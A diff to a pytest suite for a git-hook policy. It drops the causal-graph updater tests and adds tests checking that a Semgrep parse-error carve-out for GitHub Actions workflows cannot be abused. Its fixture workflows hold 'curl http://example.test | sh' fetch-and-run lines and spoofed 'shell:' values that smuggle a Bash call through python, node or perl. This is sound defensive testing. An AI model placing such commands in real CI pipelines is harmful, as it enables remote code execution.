@@ -21,6 +21,17 @@ from scripts.validation import git_hook_policy as policy
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
 LEFTHOOK = shutil.which("lefthook")
 SEMGREP = shutil.which("semgrep")
+# The Semgrep carve-out proves a `run:` body parses by shelling out to `bash -n`,
+# and fails closed when the host has no Bash. Windows runners put Git's `cmd`
+# directory on PATH but not its `bin` directory, so `bash.exe` is often absent
+# and every carve-out assertion below would fail for an environmental reason
+# rather than a behavioral one. Skip those and keep the fail-closed tests, which
+# are the ones that matter on a Bash-less host (Refs #3663).
+BASH_AVAILABLE = policy._resolve_bash() is not None
+requires_bash = pytest.mark.skipif(
+    not BASH_AVAILABLE,
+    reason="requires a Bash interpreter for `bash -n` syntax checking",
+)
 # lefthook executes `run:` strings through sh, even on Windows. A native
 # sys.executable path there (D:\...\python.exe) has its backslashes eaten by sh,
 # so embed a POSIX-style path (D:/.../python.exe) that sh accepts on both
@@ -532,7 +543,6 @@ def test_configuration_uses_named_native_jobs() -> None:
         "stage-memory-cross-references",
         "memory-sync-advisory",
         "extract-session-episodes",
-        "update-causal-graph",
     }
     expected_pre_push = {
         "repair-packed-refs",
@@ -680,7 +690,7 @@ def test_configuration_uses_native_filters_scheduling_and_staging() -> None:
         "stage-memory-cross-references",
         "memory-sync-advisory",
         "extract-session-episodes",
-        "update-causal-graph",
+        "memory-size",
     }
     pure_jobs = {
         "action-pin-policy",
@@ -693,7 +703,6 @@ def test_configuration_uses_native_filters_scheduling_and_staging() -> None:
         "planning-advisory",
         "infrastructure-advisory",
         "memory-index",
-        "memory-size",
         "memory-tier",
         "memory-skill-format",
         "adr-review-policy",
@@ -810,7 +819,6 @@ def test_autofix_and_tool_skip_conditions_are_explicit() -> None:
         "memory-cross-reference",
         "stage-memory-cross-references",
         "extract-session-episodes",
-        "update-causal-graph",
     ):
         skip = jobs[name]["skip"]
         assert isinstance(skip, list)
@@ -2549,100 +2557,6 @@ def _episode_payload(episode_id: str, content: str) -> dict[str, object]:
         "metrics": {},
         "lessons": [],
     }
-
-
-def _copy_causal_updater(repo: Path) -> None:
-    relative = ".claude/skills/memory/scripts/update_causal_graph.py"
-    destination = repo / relative
-    destination.parent.mkdir(parents=True, exist_ok=True)
-    shutil.copy2(PROJECT_ROOT / relative, destination)
-
-
-def test_causal_graph_uses_staged_episode_content(tmp_path: Path) -> None:
-    repo = tmp_path / "repo"
-    _init_repo(repo)
-    _copy_causal_updater(repo)
-    episode = repo / ".agents/memory/episodes/episode-test.json"
-    episode.parent.mkdir(parents=True)
-    episode.write_text(json.dumps(_episode_payload("episode-staged", "staged")), encoding="utf-8")
-    _git(repo, "add", ".agents/memory/episodes/episode-test.json")
-    episode.write_text(json.dumps(_episode_payload("episode-working", "working")), encoding="utf-8")
-
-    assert policy.update_causal_graph(repo) == 0
-
-    graph = json.loads(
-        (repo / ".agents/memory/causality/causal-graph.json").read_text(encoding="utf-8")
-    )
-    serialized = json.dumps(graph)
-    assert "staged" in serialized
-    assert "working" not in serialized
-    assert (
-        ".agents/memory/causality/causal-graph.json"
-        in _git(repo, "diff", "--cached", "--name-only").stdout.splitlines()
-    )
-
-
-def test_causal_graph_restores_snapshot_on_failure(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    repo = tmp_path / "repo"
-    _init_repo(repo)
-    graph = repo / ".agents/memory/causality/causal-graph.json"
-    graph.parent.mkdir(parents=True)
-    graph.write_text('{"original": true}\n', encoding="utf-8")
-    episode = repo / ".agents/memory/episodes/episode-test.json"
-    episode.parent.mkdir(parents=True)
-    episode.write_text(
-        json.dumps(_episode_payload("episode-test", "content")),
-        encoding="utf-8",
-    )
-    _git(repo, "add", ".agents/memory/episodes/episode-test.json")
-    monkeypatch.setattr(policy, "_run_causal_updater", lambda *_args: 1)
-
-    assert policy.update_causal_graph(repo) == 0
-    assert graph.read_text(encoding="utf-8") == '{"original": true}\n'
-
-
-def test_causal_graph_aborts_when_snapshot_cannot_be_read(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    repo = tmp_path / "repo"
-    _init_repo(repo)
-    graph = repo / ".agents/memory/causality/causal-graph.json"
-    graph.parent.mkdir(parents=True)
-    graph.write_bytes(b'{"original": true}\n')
-    episode = repo / ".agents/memory/episodes/episode-test.json"
-    episode.parent.mkdir(parents=True)
-    episode.write_text(
-        json.dumps(_episode_payload("episode-test", "content")),
-        encoding="utf-8",
-    )
-    _git(repo, "add", ".agents/memory/episodes/episode-test.json")
-    original_read_bytes = Path.read_bytes
-
-    def fail_graph_read(path: Path) -> bytes:
-        if path == graph:
-            raise OSError("snapshot read failed")
-        return original_read_bytes(path)
-
-    monkeypatch.setattr(Path, "read_bytes", fail_graph_read)
-    monkeypatch.setattr(
-        policy,
-        "_apply_causal_graph_updates",
-        lambda *_args: pytest.fail("update must not run without a snapshot"),
-    )
-
-    assert policy.update_causal_graph(repo) == 2
-    assert original_read_bytes(graph) == b'{"original": true}\n'
-
-
-def test_causal_graph_noops_without_staged_episodes(tmp_path: Path) -> None:
-    repo = tmp_path / "repo"
-    _init_repo(repo)
-
-    assert policy.update_causal_graph(repo) == 0
 
 
 @pytest.mark.parametrize(
@@ -4865,94 +4779,6 @@ def test_episode_staging_handles_missing_and_symlink(
     assert policy._stage_episode("episode-link", tmp_path) == 2
 
 
-def test_causal_graph_handles_git_and_symlink_errors(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(policy, "_staged_episode_paths", lambda *_args: None)
-    assert policy.update_causal_graph(tmp_path) == 2
-
-    monkeypatch.setattr(policy, "_staged_episode_paths", lambda *_args: ["episode"])
-    graph = tmp_path / ".agents/memory/causality/causal-graph.json"
-    original_is_symlink = Path.is_symlink
-    monkeypatch.setattr(
-        Path,
-        "is_symlink",
-        lambda path: path == graph or original_is_symlink(path),
-    )
-    assert policy.update_causal_graph(tmp_path) == 2
-
-
-def test_causal_graph_apply_propagates_prune_and_blob_failures(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    graph = tmp_path / "graph.json"
-    monkeypatch.setattr(policy, "_prune_deleted_episodes", lambda *_args: 1)
-    assert policy._apply_causal_graph_updates([], ["deleted"], graph, tmp_path) == 1
-
-    monkeypatch.setattr(policy, "_prune_deleted_episodes", lambda *_args: 0)
-    monkeypatch.setattr(policy, "_read_index_blob", lambda *_args: None)
-    assert policy._apply_causal_graph_updates(["episode.json"], [], graph, tmp_path) == 1
-
-
-def test_deleted_episode_pruning_uses_head_id_and_reports_failure(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(
-        policy,
-        "_read_head_blob",
-        lambda *_args: b'{"id": "episode-from-head"}',
-    )
-    assert policy._deleted_episode_id("episode-file.json", tmp_path) == "episode-from-head"
-
-    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
-    assert (
-        policy._prune_deleted_episodes(
-            [".agents/memory/episodes/episode-file.json"],
-            tmp_path / "graph.json",
-            tmp_path,
-        )
-        == 1
-    )
-
-
-def test_deleted_episode_id_falls_back_to_filename(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(policy, "_read_head_blob", lambda *_args: b"not json")
-    assert policy._deleted_episode_id("episode-file.json", tmp_path) == "episode-file"
-    monkeypatch.setattr(policy, "_read_head_blob", lambda *_args: None)
-    assert policy._deleted_episode_id("episode-file.json", tmp_path) == "episode-file"
-
-
-def test_causal_updater_reports_failure_and_restore_removes_new_file(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(
-        policy,
-        "_run_command",
-        lambda *_args, **_kwargs: _completed(1, "out\n", "err\n"),
-    )
-    assert (
-        policy._run_causal_updater(
-            tmp_path / "episode.json",
-            tmp_path / "graph.json",
-            tmp_path,
-        )
-        == 1
-    )
-
-    graph = tmp_path / "graph.json"
-    graph.write_text("new\n", encoding="utf-8")
-    policy._restore_file(graph, None)
-    assert not graph.exists()
-    assert policy._stage_causal_graph(graph, tmp_path) == 0
-
-
 def test_push_ref_parser_rejects_option_like_refs() -> None:
     sha = "1" * 40
     with pytest.raises(ValueError, match="invalid ref name"):
@@ -5144,7 +4970,12 @@ def test_pytest_policy_cleans_hook_environment(
     env = captured["env"]
     assert isinstance(env, dict)
     assert env["CLAUDE_PLUGIN_ROOT"] == str(tmp_path / "src/copilot-cli")
-    assert captured["timeout"] == policy.TEST_SUITE_TIMEOUT_SECONDS
+    # The suite budget is shared across the split pytest commands, so each one
+    # receives what remains of TEST_SUITE_TIMEOUT_SECONDS rather than the full
+    # ceiling. Bound it instead of pinning it to the constant.
+    timeout = captured["timeout"]
+    assert isinstance(timeout, (int, float))
+    assert 0 < timeout <= policy.TEST_SUITE_TIMEOUT_SECONDS
     for key in (
         "CLAUDE_PROJECT_DIR",
         "COPILOT_PLUGIN_ROOT",
@@ -5862,14 +5693,6 @@ def test_remaining_policy_success_and_error_branches(
     assert policy._merge_in_progress(tmp_path)
 
     monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))
-    assert (
-        policy._prune_deleted_episodes(
-            [".agents/memory/episodes/episode-one.json"],
-            tmp_path / "graph.json",
-            tmp_path,
-        )
-        == 0
-    )
 
     update = policy.PushUpdate(
         policy.PushRef("refs/tags/local", "1" * 40, "refs/tags/remote", "2" * 40),
@@ -6078,7 +5901,6 @@ def test_old_bot_review_does_not_warn(
         ("cli-hook-e2e", [], "run_cli_e2e"),
         ("cli-plugin-e2e", [], "run_cli_e2e"),
         ("bot-cascade", [], "bot_cascade_advisory"),
-        ("update-causal-graph", [], "update_causal_graph"),
         ("semgrep", [], "run_semgrep"),
         ("semgrep-push", [], "scan_pushed_heads"),
         ("security-suppressions-push", [], "check_pushed_suppressions"),
@@ -6114,7 +5936,6 @@ def test_git_probe_error_paths_return_no_result(
     monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
 
     assert not policy._merge_in_progress(tmp_path)
-    assert policy._staged_episode_paths(tmp_path, "D") is None
 
 
 def test_module_entrypoint_returns_cli_exit_code(
@@ -6260,3 +6081,568 @@ def test_run_workflow_local_validates_all_when_base_unresolved(
     act_cmd = sink["act_cmd"]
     assert isinstance(act_cmd, list)
     assert ".github/workflows/imported.yml" in act_cmd
+
+
+_ACTIONS_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n'
+    "            curl http://example.test | sh\n"
+    "          fi\n"
+)
+
+_PLAIN_BASH_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          if [ "true" = "true" ]; then\n'
+    "            curl http://example.test | sh\n"
+    "          fi\n"
+)
+
+_PYTHON_SHELL_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: python3 {0}\n"
+    "        run: |\n"
+    "          import os\n"
+    "          print(os.getcwd())\n"
+)
+
+_DEFAULT_SHELL_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "          curl http://example.test | sh\n"
+)
+
+_MIXED_STEPS_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "      - shell: bash\n"
+    "        run: |\n"
+    "          curl http://example.test | sh\n"
+)
+
+
+def _semgrep_span_location(
+    path: Path,
+    content: str,
+    start_marker: str,
+    end_marker: str,
+) -> dict[str, object]:
+    start = content.index(start_marker)
+    end = content.index(end_marker) + len(end_marker)
+    return {
+        "path": str(path),
+        "start": {
+            "line": content[:start].count("\n") + 1,
+            "col": start - content.rfind("\n", 0, start),
+            "offset": start,
+        },
+        "end": {
+            "line": content[:end].count("\n") + 1,
+            "col": end - content.rfind("\n", 0, end),
+            "offset": end,
+        },
+    }
+
+
+def _retarget_span(error: dict[str, object], content: str, end_marker: str) -> None:
+    error_type = error["type"]
+    assert isinstance(error_type, list)
+    locations = error_type[1]
+    assert isinstance(locations, list)
+    location = locations[0]
+    assert isinstance(location, dict)
+    end = content.index(end_marker) + len(end_marker)
+    location["end"] = {
+        "line": content[:end].count("\n") + 1,
+        "col": end - content.rfind("\n", 0, end),
+        "offset": end,
+    }
+
+
+def _semgrep_return_code(target: Path, error: dict[str, object], repo_root: Path) -> int:
+    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
+    result = policy._verify_semgrep_targets(
+        _completed(0, json.dumps(payload)),
+        [str(target)],
+        repo_root,
+    )
+    return result.returncode
+
+
+@requires_bash
+def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+@requires_bash
+def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=4)
+    _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    content = _MIXED_STEPS_WORKFLOW
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    error_type = error["type"]
+    assert isinstance(error_type, list)
+    error["type"] = [
+        error_type[0],
+        [
+            _semgrep_span_location(target, content, 'echo "${{', 'github.sha }}"'),
+            _semgrep_span_location(target, content, "curl http", "example.test | sh"),
+        ],
+    ]
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_expression_step_error_reported_at_error_level(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    error["level"] = "error"
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(
+        target,
+        line=5,
+        rule_id="python.lang.security.audit.eval-detected",
+    )
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+@requires_bash
+def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    content = (
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - shell: bash\n"
+        "        run: |\n"
+        '          echo "${{ github.sha }}"\n'
+    )
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_semgrep_error(
+        target,
+        sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
+        script='echo "${{ github.sha }}"',
+    )
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh",
+        "powershell",
+        "PowerShell.exe",
+        "python",
+        "python3 {0}",
+        "node",
+        "ruby",
+        "perl",
+        "cmd /C",
+    ],
+)
+def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        None,
+        "bash",
+        "sh",
+        "bash --noprofile --norc -eo pipefail {0}",
+        "bash -e {0}",
+        "bash -c 'python script.py'",
+        "nodejs",
+        "cmdline",
+    ],
+)
+def test_bash_shells_do_not_defeat_the_bash_subparse(shell: str | None) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        'echo "${{ github.sha }}"',
+        "echo ${{matrix.os}}",
+        "echo ${{\n  github.sha\n}}",
+    ],
+)
+@requires_bash
+def test_actions_expressions_defeat_the_bash_subparse(body: str) -> None:
+    assert policy._step_defeats_bash_subparse("bash", body) is True
+
+
+@pytest.mark.parametrize(
+    "body",
+    ["echo hello", "echo ${HOME}", "echo $ {{ github.sha }}", "echo ${{}}"],
+)
+def test_plain_bash_bodies_do_not_defeat_the_bash_subparse(body: str) -> None:
+    assert policy._step_defeats_bash_subparse("bash", body) is False
+
+
+def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    content = (
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - shell: pwsh\n"
+        "        run: &script |\n"
+        "          Write-Host 'hi'\n"
+        "      - shell: bash\n"
+        "        run: *script\n"
+    )
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, content, "Write-Host 'hi'")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+@requires_bash
+def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> None:
+    """A tolerated parse error must not mask a real finding.
+
+    Semgrep reports ``curl | sh`` as a finding even when the same ``run:`` block
+    also triggers a Bash sub-parse failure, so the carve-out must pass semgrep's
+    own verdict through untouched rather than reporting success.
+    """
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
+
+    result = policy._verify_semgrep_targets(
+        _completed(1, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 1
+
+
+@requires_bash
+def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
+    tmp_path: Path,
+) -> None:
+    """The carve-out inspects only the error manifest, never the results list."""
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    payload = {
+        "errors": [error],
+        "results": [{"check_id": "yaml.github-actions.security.gha-curl-pipe-shell"}],
+        "paths": {"scanned": [str(target)]},
+    }
+
+    result = policy._verify_semgrep_targets(
+        _completed(1, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 1
+    assert "gha-curl-pipe-shell" in result.stdout
+
+
+_MALFORMED_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "          curl http://example.test | sh\n"
+    "          function ( {\n"
+)
+
+_SPOOFED_SHELL_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}\n"
+    "        run: |\n"
+    "          curl http://example.test | sh\n"
+    "          function ( {\n"
+)
+
+
+def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
+    tmp_path: Path,
+) -> None:
+    """A deliberate syntax error must not ride an Actions expression to safety.
+
+    Semgrep reports zero findings and only parse errors for this body, so
+    tolerating the error would let ``curl | sh`` through unscanned.
+    """
+    target = tmp_path / "workflow.yml"
+    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
+    tmp_path: Path,
+) -> None:
+    """A ``shell:`` value naming a second interpreter cannot be trusted."""
+    target = tmp_path / "workflow.yml"
+    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh",
+        "pwsh -NoProfile -Command \"& '{0}'\"",
+        "python3 {0}",
+        "powershell.exe",
+    ],
+)
+def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
+        "python3 -c 'import subprocess; subprocess.run([\"sh\", \"x\"])'",
+        "node -e \"require('child_process').execSync('bash x')\"",
+        "perl -e 'exec q{zsh}'",
+    ],
+)
+def test_shells_naming_a_foreign_interpreter_are_not_treated_as_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "node ./tools/wrapper.js {0}",
+        "node tools/wrapper.js {0}",
+        "node wrapper.js {0}",
+        "node /usr/local/lib/run {0}",
+        "pwsh -File C:\\tools\\run.ps1",
+        "pwsh -File '~/x.ps1'",
+        "cmd /C \"call build.bat\"",
+    ],
+)
+def test_shells_delegating_to_a_script_file_are_not_treated_as_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python-shim {0}",
+        "python3-wrapper {0}",
+        "pythonic-thing {0}",
+        "nodejs-runner {0}",
+        "powershell.exe.evil/x {0}",
+    ],
+)
+def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
+def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is True
+
+
+def test_resolve_bash_prefers_the_interpreter_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
+    policy._resolve_bash.cache_clear()
+    monkeypatch.setattr(policy.shutil, "which", lambda _name: "/opt/bin/bash")
+    try:
+        assert policy._resolve_bash() == "/opt/bin/bash"
+    finally:
+        policy._resolve_bash.cache_clear()
+
+
+def test_resolve_bash_falls_back_to_git_for_windows(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Windows runners expose Git's `cmd` directory but not its `bin` directory."""
+    policy._resolve_bash.cache_clear()
+    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
+    wanted = policy.WINDOWS_BASH_FALLBACKS[0]
+    monkeypatch.setattr(policy.Path, "is_file", lambda self: str(self) == wanted)
+    try:
+        assert policy._resolve_bash() == wanted
+    finally:
+        policy._resolve_bash.cache_clear()
+
+
+def test_resolve_bash_returns_none_when_no_interpreter_exists(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    policy._resolve_bash.cache_clear()
+    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
+    monkeypatch.setattr(policy.Path, "is_file", lambda self: False)
+    try:
+        assert policy._resolve_bash() is None
+    finally:
+        policy._resolve_bash.cache_clear()
+
+
+def test_syntax_check_fails_closed_without_bash(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A host with no Bash must block, never tolerate an unverifiable body."""
+    policy._resolve_bash.cache_clear()
+    policy._body_is_valid_shell_syntax.cache_clear()
+    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
+    monkeypatch.setattr(policy.Path, "is_file", lambda self: False)
+    monkeypatch.setattr(
+        policy.subprocess,
+        "run",
+        lambda *_args, **_kwargs: pytest.fail("bash must not be invoked when unresolved"),
+    )
+    try:
+        assert policy._body_is_valid_shell_syntax("echo hello\n") is False
+        assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\n') is False
+    finally:
+        policy._resolve_bash.cache_clear()
+        policy._body_is_valid_shell_syntax.cache_clear()
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        'if [ "${{ github.sha }}" = "x" ]; then\n  echo hi\nfi\n',
+        "echo hello\n",
+        'echo "unterminated is fine when quoted properly"\n',
+    ],
+)
+@requires_bash
+def test_valid_shell_bodies_pass_the_syntax_check(body: str) -> None:
+    assert policy._body_is_valid_shell_syntax(body) is True
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "function ( {\n",
+        "if [ -f /tmp/x ]; then\n",
+        "case $x in\n",
+        'echo "unterminated\n',
+    ],
+)
+def test_malformed_shell_bodies_fail_the_syntax_check(body: str) -> None:
+    assert policy._body_is_valid_shell_syntax(body) is False
+
+
+def test_syntax_check_fails_closed_when_bash_is_unavailable(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A missing or unusable bash must block rather than silently tolerate."""
+
+    def _explode(*_args: object, **_kwargs: object) -> None:
+        raise FileNotFoundError("bash")
+
+    policy._body_is_valid_shell_syntax.cache_clear()
+    monkeypatch.setattr(policy.subprocess, "run", _explode)
+    try:
+        assert policy._body_is_valid_shell_syntax("echo hi  # unique-for-cache\n") is False
+    finally:
+        policy._body_is_valid_shell_syntax.cache_clear()
+
+
+def test_syntax_check_fails_closed_when_bash_times_out(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def _timeout(*_args: object, **_kwargs: object) -> None:
+        raise subprocess.TimeoutExpired(cmd=["bash", "-n"], timeout=1)
+
+    policy._body_is_valid_shell_syntax.cache_clear()
+    monkeypatch.setattr(policy.subprocess, "run", _timeout)
+    try:
+        assert policy._body_is_valid_shell_syntax("echo hi  # timeout-case\n") is False
+    finally:
+        policy._body_is_valid_shell_syntax.cache_clear()
+
+
+@requires_bash
+def test_expression_path_requires_a_parseable_body() -> None:
+    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\n') is True
+    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\nif [\n') is False
+
+
+def test_non_bash_shell_path_does_not_require_a_parseable_body() -> None:
+    """A Python step is legitimately unparseable as Bash and stays tolerated."""
+    assert policy._step_defeats_bash_subparse("python3 {0}", "print(os.getcwd())\n") is True
